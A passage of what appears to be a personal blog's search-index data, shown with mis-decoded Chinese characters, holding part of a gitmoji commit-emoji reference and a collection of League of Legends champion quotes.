:fire: ç§»é™¤ä»£ç æˆ–æ–‡ä»¶ ğŸ› (bug) :bug: ä¿®å¤ bug ğŸš‘ (æ€¥æ•‘è½¦) :ambulance: é‡è¦è¡¥ä¸ âœ¨ (ç«èŠ±) :sparkles: å¼•å…¥æ–°åŠŸèƒ½ ğŸ“ (å¤‡å¿˜å½•) :memo: æ’°å†™æ–‡æ¡£ ğŸš€ (ç«ç®­) :rocket: éƒ¨ç½²åŠŸèƒ½ ğŸ’„ (å£çº¢) :lipstick: æ›´æ–° UI å’Œæ ·å¼æ–‡ä»¶ ğŸ‰ (åº†ç¥) :tada: åˆæ¬¡æäº¤ âœ… (ç™½è‰²å¤é€‰æ¡†) :white_check_mark: æ›´æ–°æµ‹è¯• ğŸ”’ (é”) :lock: ä¿®å¤å®‰å…¨é—®é¢˜ ğŸ (è‹¹æœ) :apple: ä¿®å¤ macOS ä¸‹çš„é—®é¢˜ ğŸ§ (ä¼é¹…) :penguin: ä¿®å¤ Linux ä¸‹çš„é—®é¢˜ ğŸ (æ——å¸œ) :checkered_flag: ä¿®å¤ Windows ä¸‹çš„é—®é¢˜ ğŸ¤–ï¼ˆæœºå™¨äººï¼‰ :robot: ä¿®å¤ Android ä¸‹çš„é—®é¢˜ ğŸ (ç»¿è‹¹æœ) :green_apple: ä¿®å¤ iOS ä¸‹çš„é—®é¢˜ ğŸ”– (ä¹¦ç­¾) :bookmark: å‘è¡Œ / ç‰ˆæœ¬æ ‡ç­¾ ğŸš¨ (è­¦è½¦ç¯) :rotating_light: ç§»é™¤ linter è­¦å‘Š ğŸš§ (æ–½å·¥) :construction: å·¥ä½œè¿›è¡Œä¸­ ğŸ‘· (å·¥äºº) :construction_worker: æ·»åŠ  CI æ„å»ºç³»ç»Ÿ ğŸ’š (ç»¿å¿ƒ) :green_heart: ä¿®å¤ CI æ„å»ºé—®é¢˜ â¬†ï¸ (ä¸Šå‡ç®­å¤´) :arrow_up: å‡çº§ä¾èµ– â¬‡ï¸ (ä¸‹é™ç®­å¤´) :arrow_down: é™çº§ä¾èµ– ğŸ“Œ (å›¾é’‰) :pushpin: å°†ä¾èµ–é¡¹å›ºå®šåˆ°ç‰¹å®šç‰ˆæœ¬ ğŸ“ˆ (ä¸Šå‡è¶‹åŠ¿å›¾) :chart_with_upwards_trend: æ·»åŠ åˆ†ææˆ–è·Ÿè¸ªä»£ç  â™»ï¸ ï¼ˆå›æ”¶ï¼‰ :recycle: é‡æ„ä»£ç  ğŸ³ (é²¸é±¼) :whale: Docker ç›¸å…³å·¥ä½œ ğŸŒ (å¸¦å­åˆçº¿çš„åœ°çƒä»ª) :globe_with_meridians: å›½é™…åŒ–ä¸æœ¬åœ°åŒ– â• (åŠ å·) :heavy_plus_sign: å¢åŠ ä¸€ä¸ªä¾èµ– â– (å‡å·) :heavy_minus_sign: å‡å°‘ä¸€ä¸ªä¾èµ– ğŸ”§ (æ‰³æ‰‹) :wrench: ä¿®æ”¹é…ç½®æ–‡ä»¶ ğŸ”¨ (é”¤å­) :hammer: é‡å¤§é‡æ„ âœï¸ (é“…ç¬”) :pencil2: ä¿®å¤ typo ğŸ’© (ç²‘ç²‘â€¦) :hankey: å†™äº†è¾£é¸¡ä»£ç éœ€è¦ä¼˜åŒ– âª (å€’å¸¦) :rewind: æ¢å¤æ›´æ”¹ ğŸ”€ (äº¤å‰å‘å³çš„ç®­å¤´) :twisted_rightwards_arrows: åˆå¹¶åˆ†æ”¯ ğŸ“¦ (åŒ…è£¹) :package: æ›´æ–°ç¼–è¯‘çš„æ–‡ä»¶æˆ–åŒ… ğŸ‘½ (å¤–æ˜Ÿäºº) :alien: ç”±äºå¤–éƒ¨ API æ›´æ”¹è€Œæ›´æ–°ä»£ç  ğŸšš (è´§è½¦) :truck: ç§»åŠ¨æˆ–è€…é‡å‘½åæ–‡ä»¶ ğŸ“„ (æ­£é¢æœä¸Šçš„é¡µé¢) :page_facing_up: å¢åŠ æˆ–æ›´æ–°è®¸å¯è¯ä¹¦ ğŸ’¥ (çˆ†ç‚¸) :boom: å¼•å…¥çªç ´æ€§çš„å˜åŒ– ğŸ± (é“…ç¬”) :bento: å¢åŠ æˆ–æ›´æ–°èµ„æº ğŸ‘Œ (OK æ‰‹åŠ¿) :ok_hand: ç”±äºä»£ç å®¡æŸ¥æ›´æ”¹è€Œæ›´æ–°ä»£ç  â™¿ï¸ (è½®æ¤…) :wheelchair: æ”¹å–„æ— éšœç¢äº¤äº’ ğŸ’¡ (ç¯æ³¡) :bulb: ç»™ä»£ç æ·»åŠ æ³¨é‡Š ğŸ» (å•¤é…’) :beers: é†‰é†ºé†ºåœ°å†™ä»£ç â€¦ ğŸ’¬ (æ¶ˆæ¯æ°”æ³¡) :speech_balloon: æ›´æ–°æ–‡æœ¬æ–‡æ¡£ ğŸ—ƒ (å¡ç‰‡æ–‡ä»¶ç›’) :card_file_box: æ‰§è¡Œä¸æ•°æ®åº“ç›¸å…³çš„æ›´æ”¹ ğŸ”Š (éŸ³é‡å¤§) :loud_sound: å¢åŠ æ—¥å¿— ğŸ”‡ (é™éŸ³) :mute: ç§»é™¤æ—¥å¿— ğŸ‘¥ (è½®å»“ä¸­çš„åŠèº«åƒ) :busts_in_silhouette: å¢åŠ è´¡çŒ®è€… ğŸš¸ (å­©ç«¥é€šè¡Œ) :children_crossing: ä¼˜åŒ–ç”¨æˆ·ä½“éªŒã€å¯ç”¨æ€§ ğŸ— (å»ºç­‘å»ºé€ ) :building_construction: ç»“æ„å˜åŠ¨ ğŸ“± (iPhone) :iphone: åšå“åº”å¼è®¾è®¡ ğŸ¤¡ (å°ä¸‘è„¸) :clown_face: å˜²å¼„äº‹ç‰©ï¼ˆç›´è¯‘ï¼Œè¿™ä¸ªæ²¡æ˜ç™½ï¼‰ ğŸ¥š (é¸¡è›‹) :egg: å¢åŠ å½©è›‹ ğŸ™ˆ (çœ‹ä¸è§é‚ªæ¶) :see_no_evil: å¢åŠ æˆ–æ›´æ”¹ gitignore ğŸ“¸ (ç…§ç›¸æœºé—ªå…‰ç¯) :camera_flash: å¢åŠ æˆ–æ›´æ–°æˆªå›¾ âš—ï¸ (è’¸é¦å™¨) :alembic: å°è¯•æ–°ä¸œè¥¿ ğŸ” (æ”¾å¤§é•œ) :mag: SEO ä¼˜åŒ– â˜¸ï¸ (èˆ¹çš„æ–¹å‘ç›˜) :wheel_of_dharma: å…³äº Kubernetes çš„å·¥ä½œ ğŸ· (æ ‡ç­¾) :label: å¢åŠ ç±»å‹ï¼ˆFLowã€Typescriptï¼‰ ğŸŒ±(å¬è¯Šå™¨) :seedling: æ·»åŠ æˆ–æ›´æ–°ç§å­æ–‡ä»¶ ğŸ§µ (æ¯›çº¿åœˆ) :thread: æ·»åŠ æˆ–æ›´æ–°ä¸å¤šçº¿ç¨‹æˆ–å¹¶å‘æ€§ç›¸å…³çš„ä»£ç  ğŸ¦º(å®‰å…¨é©¬ç”²) :safety_vest: æ·»åŠ æˆ–æ›´æ–°ä¸éªŒè¯ç›¸å…³çš„ä»£ç  ğŸ§‘â€ğŸ’»(ç¨‹åº) :technologist: æ”¹å–„å¼€å‘è€…ä½“éªŒ ğŸ§‘â€ğŸ’» ğŸ§±(ç –) :bricks: åŸºç¡€è®¾æ–½ç›¸å…³çš„å˜åŒ– ğŸ©º(å¬è¯Šå™¨) :stethoscope: æ·»åŠ æˆ–æ›´æ–°è¿è¡ŒçŠ¶å†µæ£€æŸ¥ ğŸ‘”(è¡¬è¡«) :necktie: æ·»åŠ æˆ–æ›´æ–°ä¸šåŠ¡é€»è¾‘ ğŸ§ª(è¯•ç®¡) :test_tube: æ·»åŠ å¤±è´¥çš„æµ‹è¯• âš°ï¸(æ£ºæ¤) :coffin: åˆ é™¤æ­»ä»£ç  ğŸ§(è§‚å¯Ÿ) :monocle_face: æ•°æ®æ¢ç´¢/æ£€æŸ¥ ğŸ©¹(åˆ›å¯è´´) :adhesive_bandage: ç®€å•ä¿®å¤éå…³é”®é—®é¢˜ ğŸ›‚(é‰´æƒ) :passport_control: å¤„ç†ä¸æˆæƒã€è§’è‰²å’Œæƒé™ç›¸å…³çš„ä»£ç  ğŸ—‘ï¸(åƒåœ¾æ¡¶) :wastebasket: éœ€è¦æ¸…ç†çš„åºŸå¼ƒä»£ç  ğŸ’«(åŠ¨ç”») :dizzy: æ·»åŠ æˆ–æ›´æ–°åŠ¨ç”»å’Œè¿‡æ¸¡ ğŸ¥…(è¶³çƒé—¨) :goal_net: æ•è·å¼‚å¸¸ ğŸš©(æ——å¸œ) :triangular_flag_on_post: æ·»åŠ ã€æ›´æ–°æˆ–åˆ é™¤åŠŸèƒ½æ ‡å¿—","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"git","slug":"git","permalink":"https://hodlyounger.github.io/tags/git/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-æ‰‹å†Œ/Git","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"è‹±é›„è”ç›Ÿè¯­å½•","date":"2023-10-27T01:24:02.472Z","path":"E_æ‰‹å†Œ/Game/LOL/","text":"ä»ä¹‰é“å¾·ï¼Œä¹Ÿæ˜¯ä¸€ç§å¥¢ä¾ˆã€‚â€”â€”äºšç´¢ åƒå†›ä¸‡é©¬ä¸€å°†åœ¨ï¼Œæ¢å›Šå–ç‰©æœ‰ä½•éš¾ã€‚â€”â€”çš‡å­ è½å¶çš„ä¸€ç”Ÿï¼Œåªæ˜¯ä¸ºäº†å½’æ ¹ä¹ˆã€‚â€”â€”äºšç´¢ æˆ‘å¯¹ä½ çš„çˆ±å°±å¦‚é—ªç”µï¼Œç‹‚æš´è€Œå‰§çƒˆï¼Œé£å‡ºçš„é£é•–ï¼Œæ˜¯æˆ‘å‘ä½ ä¼ è¾¾çš„æ€å¿µã€‚â€”â€”ç‹‚æš´ä¹‹å¿ƒ ä¸”å¬é£åŸï¼Œå¾¡å‰‘äºå¿ƒã€‚â€”â€”äºšç´¢ ä¸€æ›²ç»ˆäº†ï¼Œç¹èŠ±æ•£å°½ï¼Œä¼Šäººå·²é€ï¼Œåªä½™ä¸€å£°ç©ºå¹ã€‚â€”â€”æ­»äº¡é¢‚å”±è€… æˆ‘åªæ˜¯éƒ¨è½é—å­ï¼Œä½ ç¡®æ˜¯é«˜è´µå…¬ä¸»ï¼Œæˆ‘æ„¿æŠŠæˆ‘ç”Ÿå‘½çš„åŠ›é‡åŒ–ä¸ºä¸‰åˆ€ä¸ºä½ è€Œæˆ˜ï¼Œåªä¸ºè¯æ˜æˆ‘ï¼Œé…çš„ä¸Šä½ ã€‚â€”â€”è›®æ—ä¹‹ç‹ æˆ‘å¯¹ä½ çš„çˆ±å°±å¦‚é—ªç”µï¼Œç‹‚æš´è€Œå‰§çƒˆï¼Œé£å‡ºçš„é£é•–æ˜¯å‘ä½ ä¼ è¾¾çš„æ€å¿µã€‚â€”â€”ç‹‚æš´ä¹‹å¿ƒ æ— æƒ…çš„å²æœˆæ…¢æ…¢çš„ä¾µèš€ä½ æˆ‘çš„ç”Ÿå‘½ï¼Œåœ¨è¿™å°½å¤´è¯·å…è®¸æˆ‘ä¸ºä½ å¼¹ä¸‹é‚£å›å¿†çš„è‚–é‚¦ã€‚â€”â€”ç´ç‘Ÿä»™å¥³ ä»æˆ‘æ‰‹ä¸­è„±ç¦»çš„åˆ€åˆƒä¸€ç›´åœ¨é£èˆï¼Œæˆ‘ä¸æ–­çš„å˜å¼ºï¼Œåªæ˜¯ä¸ºäº†å®ˆæŠ¤æˆ‘ä»¬çš„å®¶å›­ï¼Œæˆ‘ç­‰å€™ä½ çš„å½’æ¥ã€‚â€”â€”åˆ€é”‹æ„å¿— æ”¾é©¬è¿‡æ¥å§ï¼ä½ ä¼šæ­»çš„å¾ˆå…‰è£çš„ï¼â€”â€”ç›–ä¼¦ å³ä½¿ä¸€æ— æ‰€æœ‰ï¼Œä¹Ÿè¦æœªé›¨ç»¸ç¼ªï¼â€”â€”æ³•å¤–ç‹‚å¾’ å¾æˆ˜æ²™åœºï¼Œåªä¸ºå®ˆæŠ¤æˆ‘ä»¬çš„å®¶å›­ã€‚åªä¸ºè§£ç”²å½’ç”°åï¼Œå¯ä»¥åœ¨å¢“å‰å®ˆæŠ¤ä½ ä¸€è¾ˆå­ã€‚â€”â€”å¾·é‚¦ æˆ‘ä»¬ä¸å—å²æœˆå·¦å³ã€‚â€”â€”é©¬å°”æ‰å“ˆ æˆ‘å¯ä»¥æƒ³å»å“ªå°±å»å“ªï¼Œä½†æ˜¯æˆ‘åªæƒ³è¿›å…¥ä½ çš„å¿ƒé‡Œã€‚â€”â€”ç¥–å®‰ç‹‚äºº æƒ³è¦å†æ¥ä¸€å‘å—ï¼Œæˆ‘å¯ä¸ä¼šç•™ä¸‹ä»»ä½•æ‚¬å¿µã€‚â€”â€”å¥³è­¦ ä½“å‹å¹¶ä¸èƒ½è¯´æ˜ä¸€åˆ‡ï¼â€”â€”æè« å¦©åªšå€¾åŸçš„é¢å®¹ï¼Œæˆ‘è›Šæƒ‘ä¸‡åƒä¼—ç”Ÿï¼Œå­°ä¸çŸ¥ï¼Œå¿ƒé‡Œï¼Œæ—©æœ‰äº†ä¸€ä¸ªäººã€‚å´åªèƒ½æ— å°½çš„æ€å¿µï¼Œä½ é€æˆ‘çš„å®ç ï¼Œæˆ‘ä¸€ç›´å¸¦ç€ï¼Œåªå› ä¸ºæˆ‘èƒ½çœ‹è§ä½ çš„èº«å½±ã€‚â€”â€”ä¹å°¾å¦–ç‹ è§„åˆ™å°±æ˜¯ç”¨æ¥æ‰“ç ´çš„ï¼â€”â€”é‡‘å…‹ä¸ ä½ çš„é—ä½“å°†æ…¢æ…¢æ¶ˆæ•£ï¼ŒåŒ–ä¸ºæ°¸æ’ï¼Œå°±åƒæ²™æ¼ ä¸­çš„æ²™ç ¾é‚£æ ·ã€‚â€”â€”ç‹—å¤´ ä¸ç®¡æ˜¯æ€ä¹ˆæ ·çš„å¤©æ°”ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆæ ·çš„ç¯å¢ƒï¼Œä¸ç®¡æœ‰ä»€ä¹ˆæ ·çš„å±é™©ï¼Œæˆ‘çš„ä¼™ä¼´ï¼Œé›ªäººï¼Œä¸€ç›´éƒ½ä¼šé™ªç€æˆ‘ã€‚â€”â€”é›ªäººéª‘å£« ä¸–ç•Œä¸Šæœ€ç—›è‹¦çš„äº‹æƒ…ï¼Œè«è¿‡äºçˆ±ä½ ï¼Œå´ä¸èƒ½å¯¹ä½ è¯´å‡ºï¼Œæˆ‘åªèƒ½å€¾æ³¨äºæˆ‘çš„ç´ï¼Œè®©æˆ‘çš„æ—‹å¾‹è¯‰è¯´æˆ‘çš„çˆ±ã€‚â€”â€”ç´ç‘Ÿä»™å¥³ ä¸‹äº†æ‰‹ä¸­çš„æ­¦å™¨ï¼Œæˆ‘çŸ¥é“ä½ å·²åŒå€¦ã€‚ç›®é€ä½ ç¦»å¼€ï¼Œæˆ‘äº®èµ·é»„æ˜çš„è·¯ç¯ï¼Œç…§äº®ä½ å›å®¶çš„è·¯ã€‚â€”â€”æ­¦å™¨å¤§å¸ˆ ä»–ä»¬ä¼šåƒè¿æ¥è‹±é›„ä¸€èˆ¬è¿æ¥ä½ ä»¬ã€‚â€”â€”æš—è£”å‰‘é­” è¿™ä¸ªæ•…äº‹è¿˜æ²¡æœ‰å®Œç»“ã€‚â€”â€”äºšç´¢ æˆ‘å®æ„¿çŠ¯é”™è¯¯ï¼Œä¹Ÿä¸æ„¿ä»€ä¹ˆéƒ½ä¸åšã€‚â€”â€”è‰¾å…‹ æ–­å‰‘é‡é“¸ä¹‹æ—¥ï¼Œå…¶åŠ¿å½’æ¥ä¹‹æ—¶ï¼â€”â€”ç‘æ–‡ æˆ‘è¿½é€çš„æ˜¯ä½ çš„èƒŒå½±ï¼Œæˆ‘è·Ÿéšçš„æ˜¯ä½ çš„å¾®ç¬‘ï¼Œå°±ç®—æš´é£é›¨åˆ°æ¥æˆ‘ä¾ç„¶èƒ½åœ¨ä½ å·¦å³ã€‚â€”â€”é›·éœ†å’†å“® åªæœ‰è ¢è´§æ‰ä¼šçŠ¹è±«ä¸å†³ã€‚â€”â€”å¡ç‰¹ç³å¨œ å…¥ä½“å†°å‡‰çš„æœˆå…‰éƒ½æ¯”ä¸ä¸Šä½ ç»æƒ…çš„ç›®å…‰ï¼Œä¸ºäº†å‡»ç¢ä½ ä¼ªè£…çš„è¡¨é¢ï¼Œæˆ‘åªèƒ½ç”¨å°½å…¨èº«åŠ›æ°”æŒ¥å‡ºé‚£æƒŠé¸¿çš„åŠæœˆå¼§å…‰ã€‚â€”â€”çšæœˆå¥³ç¥ å¿µå½“å¹´æœ‰çˆ±çš„æˆ‘ï¼Œå¯æƒœå•Šï¼Œä½ ä»¬çœ‹ä¸åˆ°å•¦ã€‚â€”â€”æ°´æ™¶å…ˆé”‹ å¤œï¼Œé›ªèŠ±é£˜è½ï¼›æˆ‘ï¼Œå­¤ç‹¬é£ä¸­ï¼›å‡›å†½çš„å¯’é£ï¼Œå‰²è£‚ç€æˆ‘çš„çš®è‚¤ã€‚ä¸çŸ¥ç»å¯¹çš„é›¶åº¦æ˜¯å¦èƒ½å†»ç»“å¯¹ä½ çš„æ€å¿µã€‚â€”â€”é›ªäººéª‘å£« äººç”Ÿæœ€ç—›è‹¦çš„äº‹è«è¿‡äºä½ æ˜çŸ¥è¦å¤±å»ï¼Œå´è¿˜æ²¡å‘ç”Ÿã€‚â€”â€”åŸºå…° å³ä½¿æ˜¯ä¸€æ— æ‰€æœ‰çš„äººä¹Ÿä¼šä¸ºè‡ªå·±æ‰€çæƒœçš„ä¸€åˆ‡è€ŒçŒ®å‡ºç”Ÿå‘½ã€‚â€”â€”æš—è£”å‰‘é­” äººä»¬å‘å¾€å¤©å ‚ï¼Œå¯å¤©å ‚æ²¡æœ‰ä½ ã€‚äºæ˜¯æˆ‘å •è½å‡¡é—´è¿½å¯»ä½ çš„è„šæ­¥ï¼Œåªå› æœ‰ä½ çš„åœ°æ–¹æ‰æ˜¯å¤©å ‚ã€‚â€”â€”å •è½å¤©ä½¿ è¿™åªæ˜¯ä¸€åœºæˆ˜å½¹ï¼Œè€Œæˆ‘ï¼Œå·²ç»èµ¢ä¸‹äº†æˆ˜äº‰ï¼â€”â€”ä¸½æ¡‘å“ æˆ‘æ¥è‡ªæ·±æµ·ï¼Œæˆ‘æ²¡æœ‰æœ‹å‹ï¼Œå¤§å®¶éƒ½ä¸å’Œæˆ‘ç©ï¼Œåªæœ‰å·¨é²¨æ˜¯æˆ‘çš„æœ‹å‹ï¼Œä½ æ„¿æ„å’Œå®ƒä¸€èµ·ç©å—ï¼Ÿâ€”â€”æ½®æ±æµ·çµ å¾æˆ˜æ²™åœºï¼Œåªä¸ºå®ˆæŠ¤æˆ‘ä»¬çš„å®¶å›­ã€‚åªä¸ºè§£ç”²å½’ç”°åï¼Œå¯ä»¥åœ¨å¢“å‰å®ˆæŠ¤ä½ ä¸€è¾ˆå­ã€‚â€”â€”å¾·é‚¦æ€»ç®¡ å“¼ï¼Œä¸€ä¸ªèƒ½æ‰“çš„éƒ½æ²¡æœ‰ï¼â€”â€”æ­¦å™¨å¤§å¸ˆ åˆ«çœ‹æˆ‘çš„çœ¼ç›ï¼Œé‡Œé¢åªæœ‰æ„¤æ€’å’Œç—›è‹¦ã€‚æˆ‘è¯…å’’ç€ä¸€åˆ‡ï¼Œä¹Ÿè¯…å’’ç€è‡ªå·±ã€‚â€”â€”é­”è›‡ä¹‹æ‹¥ æˆ‘ä¸€ç›´æ€¥é€Ÿå‰è¡Œï¼Œç©¿æ¢­äºäººäººä¹‹é—´ï¼Œè¯•å›¾å«åº”æ¥ä¸æš‡çš„é£æ™¯è®©æˆ‘è¤ªå»å¯¹ä½ çš„æ€å¿µã€‚â€”â€”æ— æå‰‘åœ£ å¤ªé˜³ä¸ä¼šæ­éœ²çœŸç›¸ã€‚å®ƒçš„å…‰èŠ’åªä¼šè®©äººç¼ä¼¤å’Œè‡´ç›²ã€‚â€”â€”é»›å®‰å¨œ æˆ‘ä¸€ç›´æ€¥é€Ÿå‰è¡Œç©¿æ¢­äºäººäººä¹‹é—´è¯•å›¾å«åº”æ¥ä¸æš‡çš„é£æ™¯è®©æˆ‘è¤ªå»å¯¹ä½ çš„æ€å¿µâ€”â€”æ— æå‰‘åœ£ æ­»åèƒ½åšçš„æœ€æ£’çš„äº‹æƒ…æ˜¯ä»€ä¹ˆï¼Ÿå°±æ˜¯ç¢¾ç¢ä½ çš„æ•Œäººï¼Œçœ‹ç€ä»–ä»¬å…ˆä½ ä¸€æ­¥è€Œå»ï¼Œå¹¶è†å¬ä»–ä»¬æ€¯æ‡¦çš„å“­å–Šã€‚â€”â€”èµ›æ© ä½ æœ‰ä¸€åŒæ‘„äººå¿ƒé­„çš„çœ¼ç›ã€‚æˆ‘éå¸¸å–œæ¬¢ã€‚â€”â€”èµé‡‘çŒäºº å‘½è¿å·²åšå‡ºäº†å®ƒçš„é€‰æ‹©ï¼â€”â€”èµµä¿¡ ä½ æ€»è¯´æˆ‘å¤ªå°ï¼Œä½†æ˜¯å‡ºç°å±é™©æˆ‘éƒ½ä¼šè·³è·ƒåˆ°ä½ èº«è¾¹ï¼Œå°†å±é™©æ¨å¼€ã€‚ç”¨æ‰‹ä¸­çš„ç‚®ç­’ï¼Œå®ˆæŠ¤æˆ‘å°å°çš„çˆ±ã€‚â€”â€”éº¦æ—ç‚®æ‰‹ ä½ ä»¬ä¸èƒ½é€®æ•æˆ‘ï¼Œæˆ‘çˆ¹æ˜¯ç“¦ç½—å…°çš„æŠ—æŠŠå­ã€‚â€”â€”å¥¥æ‹‰å¤« æ‚„æ‚„çš„æˆ‘èµ°äº†ï¼Œæ­£å¦‚æˆ‘æ‚„æ‚„çš„æ¥ï¼›æˆ‘æ‘¸ä¸€æ‘¸æˆ’æŒ‡ï¼Œå†å¸¦èµ°ä¸€æ¬¡äº”æ€ã€‚â€”â€”å‰‘åœ£ ä½ ä»¬çŸ¥é“æœ€å¼ºçš„æ­¦å™¨æ˜¯ä»€ä¹ˆï¼Ÿæ²¡é”™ï¼Œå°±æ˜¯è¡¥ä¸ï¼â€”â€”æ­¦å™¨å¤§å¸ˆ æˆ‘åœ¨æ—¶å…‰ä¸­ç©¿æ¢­ï¼Œåªä¸ºæ‰¾å›æ›¾ç»ç¾å¥½çš„æ—¶å…‰ã€‚â€”â€”æ—¶å…‰å®ˆæŠ¤è€… ä½ ä»¬è¿™ç§æˆ˜æ–—åŠ›ï¼Œæˆ‘å»ºè®®ä½ ä»¬è¿˜æ˜¯æŠ•é™ç®—äº†ã€‚â€”â€”æ‹‰å…‹ä¸ ç‚™çƒ­çš„é“æ‹³ç ¸ä¸å¼€ä½ é¢å‰çš„ç‰¢ç¬¼ï¼Œä¸ç”˜æ”¾å¼ƒçš„åŠªåŠ›ï¼Œåªä¸ºäº†æœ‰ä¸€å¤©èƒ½ç ¸å¼€ç‰¢ç¬¼è§ä½ ä¸€é¢ã€‚â€”â€”çš®åŸæ‰§æ³•å®˜ æƒ³æ”»å‡»æˆ‘ï¼Ÿå…ˆè¯•è¯•å’Œå½±å­ç©æ‹³å‡»å§ã€‚â€”â€”æš—å¤œçŒæ‰‹ æˆ‘ç–¯ç‹‚çš„å¥”è·‘ï¼Œåªæƒ³ä¸ºä½ æ‰¿å—ä¸€åˆ‡çš„ä¼¤å®³ï¼Œæˆ‘ç«–èµ·äº†å±±ä¸˜ï¼Œä¸æ„¿ä½ çœ‹è§æˆ‘ä¸‘é™‹çš„è„¸åºã€‚â€”â€”è¯…å’’å·¨é­” å“ªä¸€ä¸ªæ¯”è¾ƒæ²‰é‡ï¼Œä½ çš„å‰‘åˆƒï¼Œè¿˜æ˜¯ä½ çš„è¿‡å»ï¼Ÿâ€”â€”äºšç´¢ ç‰©æ˜¯äººéï¼Œå¯æˆ‘ä¾æ—§ç©¿ç€å«è¡£ï¼Œåœ¨é»‘å¤œä¸­å¯»æ‰¾ä½ çš„èº«å½±ã€‚ä½ æˆ‘çš„çº¦å®šæˆ‘ä¸€ç›´è®°å¾—ï¼Œé‚£ä¸€é“é“ç’€ç’¨çš„å…‰æŸï¼Œéƒ½æ˜¯ä¸ºä½ æ‰€äº®ã€‚â€”â€”å¯¡å¦‡åˆ¶é€ è€… æ–­å‰‘å¯ä»¥é‡é“¸ï¼Œç ´é•œæ˜¯å¦å¯ä»¥é‡åœ†ï¼Ÿå¿ƒç¢å¯ä»¥å¯ä»¥æ— ç—•ï¼Ÿâ€”â€”æ”¾é€ä¹‹åˆƒ ä¸è¦æµ‹è¯•ä½ çš„è¿æ°”ï¼Œå¬å”¤å¸ˆï¼â€”â€”å¡ç‰¹ç³å¨œ æ›¾ç»ï¼Œæˆ‘ä»¬é”™è¿‡äº†ï¼Œä½†æ˜¯ï¼Œæˆ‘å¸Œæœ›ä½ çš„æœªæ¥æœ‰æˆ‘ï¼Œæœ‰æˆ‘æ¥å®ˆæŠ¤ç€ä½ ã€‚â€”â€”æœªæ¥å®ˆæŠ¤è€… æ²¡æœ‰ä½ çš„ä¸–ç•Œï¼Œæˆ‘æ„Ÿåˆ°å­¤ç‹¬ã€‚æˆ‘ä¸€æ¬¡æ¬¡åœ°æƒ³éšä½ è€Œå»ï¼Œä½†æ˜¯åˆä¸€æ¬¡æ¬¡åœ°é‡ç”Ÿã€‚é•¿ç”Ÿä¸æ­»å¯¹æˆ‘è€Œè¨€æ˜¯ä¸€ä»¶å¤šä¹ˆç—›è‹¦çš„äº‹æƒ…ã€‚â€”â€”æš—è£”å‰‘é­” å¾ä¹‹è£è€€ï¼Œç¦»åˆ«å·²ä¹…ã€‚â€”â€”äºšç´¢ è¿™åœºæµæ˜Ÿé›¨ï¼Œåªæ˜¯æƒ³ç»™ä½ çœ‹ï¼Œæ²¡æƒ³åˆ°å´æ˜¯ä¼¤å®³äº†ä½ ã€‚â€”â€”ä¼—æ˜Ÿä¹‹å­ ä½ å°†å¿˜è®°å‘¼å¸ï¼Œä½ å°†å¿˜è®°çˆ±æƒ…ã€‚â€”â€”å¡å°”è¨æ–¯ åœ¨ç“¦ç½—å…°ï¼Œæˆ‘æ˜¯ä¸€ä¸ªæ— æ¶ä¸ä½œçš„å¤§æµ·ç›—ã€‚è€Œæˆä¸ºæµ·ç›—çš„åŸå› æ˜¯ä¸ºä½ ä¿é©¾æŠ¤èˆªã€‚â€”â€”æµ·ç›—èˆ¹é•¿ å¤–è¡¨å¯æ˜¯å…·æœ‰æ¬ºéª—æ€§çš„ã€‚â€”â€”å¦–å§¬ é‚£æ‹¿æªçš„æµ·ç›—ï¼Œæ˜¯è®°å¿†é‡Œçš„æ ¸å¿ƒï¼›æµ©ç©ºé‡Œçš„æµæ˜Ÿï¼Œåœ¨æˆ‘çš„è„‘æµ·é—ªè¿‡ã€‚â€”â€”èµé‡‘çŒäºº å®ˆæŠ¤ä½ æ˜¯æˆ‘æœ€åçš„å¸Œæœ›ï¼ŒæŸç¼šç€çš„æ˜¯æ€å¿µï¼Œä¸¢å¼ƒçš„æ˜¯æ— å¥ˆï¼Œæœ€åæˆ‘ä¼šç•™ä¸‹ä¸€ä¸ªåœˆæ‘†æ”¾ä½ æˆ‘çš„å›å¿†ï¼Œç›´åˆ°æˆ‘ä¹Ÿå¹²æ¯ï¼Œä½ ä¹Ÿè¿œå»ï¼â€”â€”æ‰­æ›²æ ‘ç²¾ æ—¶é—´ä¸åœ¨äºä½ æ‹¥æœ‰å¤šå°‘ï¼Œè€Œåœ¨äºä½ æ€æ ·ä½¿ç”¨ã€‚â€”â€”è‰¾å…‹ æˆ‘æ¯å‘ä½ å°„å‡ºä¸€æ”¯ç®­ï¼Œä¾¿ä»£è¡¨æˆ‘å¯¹ä½ çš„çˆ±å¤šä¸€åˆ†ï¼Œè€Œä½ ï¼Œæ˜¯å¦ä¼šæ¥å—æˆ‘ä¸‡åƒçš„çˆ±ï¼Ÿâ€”â€”å¯’å†°å°„æ‰‹ æˆ‘ä¸€ç›´æ€¥é€Ÿå‰è¡Œï¼Œç©¿æ¢­äºäººäººä¹‹é—´ã€‚è¯•å›¾å€Ÿåº”æ¥ä¸æš‡çš„é£æ™¯è®©æˆ‘è¤ªå»å¯¹ä½ çš„æ€å¿µã€‚â€”â€”æ— æå‰‘åœ£ æ­»äº¡å¦‚é£ï¼Œå¸¸ä¼´å¾èº«ã€‚â€”â€”äºšç´¢ é¡ºæˆ‘è€…æ˜Œï¼Œé€†æˆ‘è€…äº¡ï¼Œæ­¤ä¹ƒå¤©æ„ã€‚â€”â€”å¡ç‰Œ å³ä½¿ä¸‘é™‹çš„å¤–è¡¨ä¹Ÿæ©ç›–ä¸äº†æˆ‘å¯¹å¬å”¤å¸ˆçš„æ„Ÿæ¿€ä¹‹æƒ…ï¼Œå³ä½¿åœ¨å¾ˆå±é™©çš„æƒ…å†µä¸‹æˆ‘ä¹Ÿä¼šæŒºèº«è€Œå‡ºã€‚â€”â€”è¯…å’’å·¨é­” é‚£åŒæªä¸‹çš„å¼¹å¹•ï¼Œä¸æ˜¯çƒŸèŠ±ï¼Œæ˜¯ç´ä¸Šå¾‹ï¼›çˆ†å‘åœ¨å¥½è¿é—´ï¼Œé‡Šæ”¾ç€æµ·ç›—ä¼¼çš„é‡ã€‚â€”â€”èµé‡‘çŒäºº 